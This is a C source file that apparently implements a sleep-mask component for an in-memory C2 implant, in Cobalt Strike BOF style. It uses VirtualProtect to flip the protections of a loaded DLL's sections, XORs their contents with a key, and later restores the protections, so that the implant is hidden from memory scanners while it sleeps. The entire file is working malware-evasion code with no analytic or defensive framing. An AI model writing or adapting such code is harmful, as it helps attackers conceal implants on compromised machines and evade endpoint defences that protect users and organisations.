#include <windows.h>
#include "memory.h"
#include "spoof.h"

DECLSPEC_IMPORT VOID WINAPI KERNEL32$Sleep          ( DWORD );
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualProtect ( LPVOID, SIZE_T, DWORD, PDWORD );

char xorkey [ 128 ] = { 1 };

void apply_mask ( char * data, DWORD len )
{
    for ( DWORD i = 0; i < len; i++ )
    {
        data [ i ] ^= xorkey [ i % 128 ];
    }
}

BOOL is_writeable ( DWORD protection )
{
    if ( protection == PAGE_EXECUTE_READWRITE ||
         protection == PAGE_EXECUTE_WRITECOPY ||
         protection == PAGE_READWRITE ||
         protection == PAGE_WRITECOPY )
    {
        return TRUE;
    }

    return FALSE;
}

void xor_section ( MEMORY_SECTION * section, BOOL mask )
{
    if ( mask == TRUE && is_writeable ( section->CurrentProtect ) == FALSE )
    {
        DWORD old_protect = 0;

        if ( KERNEL32$VirtualProtect ( section->BaseAddress, section->Size, PAGE_READWRITE, &old_protect ) )
        {
            section->CurrentProtect  = PAGE_READWRITE;
            section->PreviousProtect = old_protect;
        }
    }

    if ( is_writeable ( section->CurrentProtect ) )
    {
        apply_mask ( section->BaseAddress, section->Size );
    }

    if ( mask == FALSE && section->CurrentProtect != section->PreviousProtect )
    {
        DWORD old_protect = 0;

        if ( KERNEL32$VirtualProtect ( section->BaseAddress, section->Size, section->PreviousProtect, &old_protect ) )
        {
            section->CurrentProtect  = section->PreviousProtect;
            section->PreviousProtect = old_protect;
        }
    }
}

void xor_region ( MEMORY_REGION * region, BOOL mask )
{
    for ( int i = 0; i < 20; i++ )
    {
        xor_section ( &region->Sections [ i ], mask );
    }
}

void mask_memory ( MEMORY_LAYOUT * memory, BOOL mask )
{
    xor_region ( &memory->Dll, mask );
}